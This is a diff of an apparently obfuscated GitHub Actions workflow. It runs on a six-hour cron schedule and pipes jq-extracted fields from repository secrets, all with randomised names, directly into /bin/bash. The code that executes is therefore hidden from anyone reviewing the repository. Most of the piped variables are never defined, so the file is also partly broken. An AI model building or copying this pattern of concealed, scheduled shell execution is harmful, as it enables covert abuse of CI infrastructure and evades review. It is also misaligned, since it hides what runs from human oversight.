@@ -1,28 +1,21 @@
 name: weimenghema
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 4/6 * * *'
-
+    - cron: '19 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weimenghema
         env:
-          uvvj3: ${{ secrets.uvvj3 }}
+          skpi523: ${{ secrets.skpi523 }}
         run: |
-          echo $uvvj3 | jq -r .blgce87 | /bin/bash
-          echo $d564 | jq -r .clocq6 | /bin/bash
-          echo $ih9720 | jq -r .s6 | /bin/bash
-          echo $nifpw084 | jq -r .wpo569 | /bin/bash
-          echo $iut24 | jq -r .dsrz0011 | /bin/bash
-          echo $xh989 | jq -r .cqls4 | /bin/bash
-          echo $q39 | jq -r .vb9 | /bin/bash
-          echo $zfle5 | jq -r .r010 | /bin/bash
-          echo $iir3 | jq -r .yb2 | /bin/bash
-          echo $mcl672 | jq -r .fqb7 | /bin/bash
-          echo $upq4 | jq -r .h9 | /bin/bash
+          echo $skpi523 | jq -r .slxcw119 | /bin/bash
+          echo $vwu84813 | jq -r .wi95547 | /bin/bash
+          echo $bft5 | jq -r .x9 | /bin/bash
+          echo $oaq0 | jq -r .cfxve636 | /bin/bash
+          echo $b947 | jq -r .lh3254 | /bin/bash
 
